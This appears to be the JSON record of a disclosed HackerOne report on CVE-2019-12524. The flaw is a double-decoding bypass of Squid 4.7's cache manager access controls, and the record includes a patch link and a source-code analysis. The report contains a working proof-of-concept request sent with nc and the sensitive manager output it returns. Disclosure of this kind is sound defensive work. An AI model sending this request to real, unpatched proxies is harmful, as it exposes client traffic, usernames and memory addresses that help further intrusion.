{
  "id": 824203,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MjQyMDM=",
  "url": "https://hackerone.com/reports/824203",
  "title": "Cache Manager ACL Bypass",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2020-03-18T23:53:54.106Z",
  "submitted_at": "2020-03-18T23:53:54.106Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "jeriko_one",
    "url": "/jeriko_one",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4S26OA6W%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T134023Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBrwAoewzxY3bz1ssFSdtEyK39n4ige2HCt%2FqgWXMxo6AiEA8W9QZL7h8ed7oBtuSQFGPQDGjUswee0LimM2YHTA1jMqsgUIdhADGgwwMTM2MTkyNzQ4NDkiDIMSY8w9rHi0W5K3diqPBbjGizLrTlN6ZGbFF9LhBmPFJ1m5swtpZ7QtuQ1ecm6xRS32Vw6P29QnZ1nCvXxHRHo6hca4PRPlC%2F0SuWjzk0o8NKsd8UrMzywQ79MxoK3cqCgX8WV8kEyJZ1wthUKdW7fS3ASByTHh9EDJx35aAAaV%2FjyX21PDJbVpBrxSai%2BI8NCYDMrESdXzFg96JAx0%2FwVm%2BdX91kGoUyEspJy20Nir3f1bZWjC7MdtcCOSsjRRpflXb4gfaH%2BL1WT1rmstsNmGjj3W3W7TeYhR6pZtPFJdtb6k%2FghNKP4k29rXq2vgyXJX%2BVcohZ1zGAdsXYKgnKO2Y3m%2BPX7s9J%2BEwjIpNQnCTqqMY1fdtAuglpVQs9wOIOz5AsX%2F3fV3pu%2FvQSQRA8Du6Cj%2BeC4F1CXAi0KT8j%2B0b0OBcdCMFF7x0ZDWnp2IvcnhJbnULpfzrU3BcnLBK5G1w73sljokf7mqqRRV2mJeZ0Ksp5PbOgcxO2a9zF3%2F8KWFXZX25btNrQCkx2iy6DjaS4wWdbHTtaTyA9KPaMdPFCZK0C8QMd1EIcXXBkK42tdRHldBFv0Qtop0xhubZI7kmNI9gIAuHZhtoU%2F051v4TKLQUh2TAOI42M0%2BTEJLZph2o6AOjkFRtLNFt7YY1LhWRiyVjOtaBUNN8WQ3Qh3vWd2mGOGt3XUF8k06PdeLUGh8KHoKU7J50qkgwAmhpZgQn9UvombEZfjpL9rMdjKsr48SewAEp5ii613cBEjgvmV9GqfxRnaBt9%2BBnmZqq%2Bqdlb6QUuoAocNShZpYRVRCujWv0rbK5%2BJsewBiul9SD4qpCHDP0iLsOH3MbGI4L4Vl8HvxUyotCrHJVcTbSu85yQg3fmRmZR%2FKVxNQjZkwy8atrgY6sQF65KaBWFLOPDup9JZh9E6aRNnp6nOc2RJjfDBuEZqnqO%2FE0eIR6%2FMnB5jQvVkuHRSmXTStKVhFSTodnbxf6Jx%2FV%2Bb7oAvc4YN%2FjwysEYMAdJ7G1ipFcWKNk%2Fy8IJiu93NTzXgZ%2BUcmX9FJKhedbl1puxNoeG9%2FJnYsNGqtzqjFHuyw9oeW7ona11lhu%2Bwq%2BU434QKAOt%2FmsX3wWtY1amD8a%2F8TawrYCNcXdx0m%2F%2FsKhD8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=597a7f7fe56260b4e2306c393889dee57b907681380080059402837c1c92bbea",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4S26OA6W%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T134023Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBrwAoewzxY3bz1ssFSdtEyK39n4ige2HCt%2FqgWXMxo6AiEA8W9QZL7h8ed7oBtuSQFGPQDGjUswee0LimM2YHTA1jMqsgUIdhADGgwwMTM2MTkyNzQ4NDkiDIMSY8w9rHi0W5K3diqPBbjGizLrTlN6ZGbFF9LhBmPFJ1m5swtpZ7QtuQ1ecm6xRS32Vw6P29QnZ1nCvXxHRHo6hca4PRPlC%2F0SuWjzk0o8NKsd8UrMzywQ79MxoK3cqCgX8WV8kEyJZ1wthUKdW7fS3ASByTHh9EDJx35aAAaV%2FjyX21PDJbVpBrxSai%2BI8NCYDMrESdXzFg96JAx0%2FwVm%2BdX91kGoUyEspJy20Nir3f1bZWjC7MdtcCOSsjRRpflXb4gfaH%2BL1WT1rmstsNmGjj3W3W7TeYhR6pZtPFJdtb6k%2FghNKP4k29rXq2vgyXJX%2BVcohZ1zGAdsXYKgnKO2Y3m%2BPX7s9J%2BEwjIpNQnCTqqMY1fdtAuglpVQs9wOIOz5AsX%2F3fV3pu%2FvQSQRA8Du6Cj%2BeC4F1CXAi0KT8j%2B0b0OBcdCMFF7x0ZDWnp2IvcnhJbnULpfzrU3BcnLBK5G1w73sljokf7mqqRRV2mJeZ0Ksp5PbOgcxO2a9zF3%2F8KWFXZX25btNrQCkx2iy6DjaS4wWdbHTtaTyA9KPaMdPFCZK0C8QMd1EIcXXBkK42tdRHldBFv0Qtop0xhubZI7kmNI9gIAuHZhtoU%2F051v4TKLQUh2TAOI42M0%2BTEJLZph2o6AOjkFRtLNFt7YY1LhWRiyVjOtaBUNN8WQ3Qh3vWd2mGOGt3XUF8k06PdeLUGh8KHoKU7J50qkgwAmhpZgQn9UvombEZfjpL9rMdjKsr48SewAEp5ii613cBEjgvmV9GqfxRnaBt9%2BBnmZqq%2Bqdlb6QUuoAocNShZpYRVRCujWv0rbK5%2BJsewBiul9SD4qpCHDP0iLsOH3MbGI4L4Vl8HvxUyotCrHJVcTbSu85yQg3fmRmZR%2FKVxNQjZkwy8atrgY6sQF65KaBWFLOPDup9JZh9E6aRNnp6nOc2RJjfDBuEZqnqO%2FE0eIR6%2FMnB5jQvVkuHRSmXTStKVhFSTodnbxf6Jx%2FV%2Bb7oAvc4YN%2FjwysEYMAdJ7G1ipFcWKNk%2Fy8IJiu93NTzXgZ%2BUcmX9FJKhedbl1puxNoeG9%2FJnYsNGqtzqjFHuyw9oeW7ona11lhu%2Bwq%2BU434QKAOt%2FmsX3wWtY1amD8a%2F8TawrYCNcXdx0m%2F%2FsKhD8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=cfef439803808e72ae8e919d1f8c7cbc048666f62e572bbf82cfaa0798d9a571"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2019-12524"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2021-08-26T23:28:49.164Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2021-07-27T23:28:48.326Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\nACL Manager can be bypassed giving non authorized users to squid-internal-mgr.\nPossible to bypass other url_regex, but only focused on manager. \n\n<= Squid-4.7 vulnerable\nSilently Fixed in Squid-4.8 \nAnnounce page was allocated, but never made http://www.squid-cache.org/Advisories/SQUID-2019_4.txt As another issue similar to this wasn't fixed \n\nPatch: http://www.squid-cache.org/Versions/v4/changesets/squid-4-e1e861eb9a04137fe81decd1c9370b13c6f18a18.patch\n\nAssigned: CVE-2019-12524\n## Steps To Reproduce:\n\n1) Start squid-4.7\n```\n./sbin/squid\n```\n\n2) Issue the following request replacing <hostname> with the hostname of the server running squid\n```\necho -e \"GET https://jeriko.one%252f@<hostname>:3128/squid-internal-mgr/active_requests HTTP/1.1\\r\\n\\r\\n\" |nc <hostname> 3128\n```\n\n```\nHTTP/1.1 200 OK\nServer: squid/4.7\nMime-Version: 1.0\nDate: Wed, 18 Mar 2020 23:41:31 GMT\nContent-Type: text/plain;charset=utf-8\nExpires: Wed, 18 Mar 2020 23:41:31 GMT\nLast-Modified: Wed, 18 Mar 2020 23:41:31 GMT\nX-Cache: MISS from g64\nTransfer-Encoding: chunked\nVia: 1.1 g64 (squid/4.7)\nConnection: keep-alive\n\n1AF\nConnection: 0x5594f78d95f8\n\tFD 10, read 85, wrote 0\n\tFD desc: Reading next request\n\tin: buf 0x5594f7d2e1a4, used 1, free 4011\n\tremote: 192.168.4.144:38376\n\tlocal: 192.168.4.144:3128\n\tnrequests: 1\nuri https://jeriko.one%2f@g64:3128/squid-internal-mgr/active_requests\nlogType TCP_MISS\nout.offset 0, out.size 0\nreq_sz 84\nentry 0x5594f7d2b720/0300000000000000291F000001000000\nstart 1584574891.149644 (0.000000 seconds ago)\nusername -\n\n\n0\n```\nYou should have accessed the active_requests page in the squid-internal-mgr \n\n## Analysis\n\nWhen Squid is checking ACLs and it wants to check if a URL is a cache manager\nURL it checks the following rule\n\n```\n default_line(\"acl manager url_regex -i ^cache_object:// +i ^https?://[^/]+/squid-internal-mgr/\");\n```\nWhen checking if the URL matches the regex the function\nACLUrlStrategy::match will be called. This will get the effectiveRequestUri,\ndecode it and then try to match it against the regex\n\n```\nACLUrlStrategy::match (ACLData<char const *> * &data, ACLFilledChecklist *checklist)\n{\n    char *esc_buf = SBufToCstring(checklist->request->effectiveRequestUri());\n    rfc1738_unescape(esc_buf);\n    int result = data->match(esc_buf);\n    xfree(esc_buf);\n    return result;\n}\n```\neffectiveRequestUri() will return url.absolute() for methods that aren't\nCONNECT and schemes that aren't PROTO_AUTHORITY_FORM\n\n Looking at Uri::absolute we see that the userInfo is included into the\n absolute uri representation if the protocol is HTTPS\n\n```\n             const bool omitUserInfo = getScheme() == AnyP::PROTO_HTTP ||\n                                      getScheme() != AnyP::PROTO_HTTPS ||\n                                      userInfo().isEmpty();\n            if (!omitUserInfo) {\n                absolute_.append(userInfo());\n                absolute_.append(\"@\", 1);\n            }\n```\nuserInfo is set in Uri::parse if the foundHost contains a @ that\nthe userinfo is extracted and then decoded.\n```\n        t = strrchr(foundHost, '@');\n        if (t != NULL) {\n            strncpy((char *) login, (char *) foundHost, sizeof(login)-1);\n            login[sizeof(login)-1] = '\\0';\n            t = strrchr(login, '@');\n            *t = 0;\n            strncpy((char *) foundHost, t + 1, sizeof(foundHost)-1);\n            foundHost[sizeof(foundHost)-1] = '\\0';\n            // Bug 4498: URL-unescape the login info after extraction\n            rfc1738_unescape(login);\n        }\n```\nThis is eventually stored in userInfo when calling parseFinish\n parseFinish(protocol, proto, urlpath, foundHost, SBuf(login), foundPort);\n\nThis userInfo is the decoded version, therefore special tokens such as ? # /\nare possible entries in the userInfo. \n\nWe see now that the URL is decoded twice when checking RegexURL acls.\n\nLet's consider the following example URL to show how we can access\nCacheManager due to this double decode flaw.\n\ng64 is the name of my Squid server\n\nhttps://jeriko.one%252f@g64:3128/squid-internal-mgr/active_requests\n\nFirst in clientProcessRequest my request will be marked as internal as the\npath is /squid-internal-mgr/active_requests, and the url.host and url.port\nmatch the Squid server hostname and port number\n```\n    if (internalCheck(request->url.path())) {\n        if (internalHostnameIs(request->url.host()) && request->url.port() == getMyPort()) {\n            debugs(33, 2, \"internal URL found: \" << request->url.getScheme() << \"://\" << request->url.authority(true));\n            http->flags.internal = true;\n```\nAs it makes it way through ACL checks it'll come against the Manager regex acl\n\nAfter the call rfc1738_unescape is made my URL is now\n\"https://jeriko.one/@g64:3128/squid-internal-mgr/active_requests\"\n\nWhich fails against the Manager regex check\n\nAs this decoding didn't change the original URL, when I reach internalStart my\npath will match against mgrPfx, giving me access to the cache manager.\n\nThe Cache manager has a lot of useful information for anyone who is curious on\nwhat type of traffic is going through a Squid server. It also provides useful\ninformation for someone trying to gain remote code execution over the server\nas the cmd active_requests holds a number of in use addresses\n\n## Impact\n\nBypasses restrictions on squid-internal-mgr. This allows an attacker to gain information on Squid clients, request being made, usernames, peer servers, servers being reversed proxied,  in memory objects, addresses of objects which can be used to break ASLR. \n\nA list can be found in stat.cc where functions are registered to the Manager.",
  "weakness": {
    "id": 142,
    "name": "Authentication Bypass Using an Alternate Path or Channel"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2021-08-26T23:28:48.406Z",
  "allow_singular_disclosure_after": -77811094.6623236,
  "singular_disclosure_allowed": true,
  "vote_count": 20,
  "voters": [
    "n1m0",
    "tolga",
    "mashoud1122",
    "fqdn",
    "ali",
    "akashhamal0x01",
    "kmxx",
    "freakytux",
    "ritesh28",
    "aseem0xff",
    "and 10 more..."
  ],
  "severity": {
    "rating": "critical",
    "score": 9.3,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "low",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 84124,
    "asset_type": "OTHER",
    "asset_identifier": "IBB (Legacy)",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
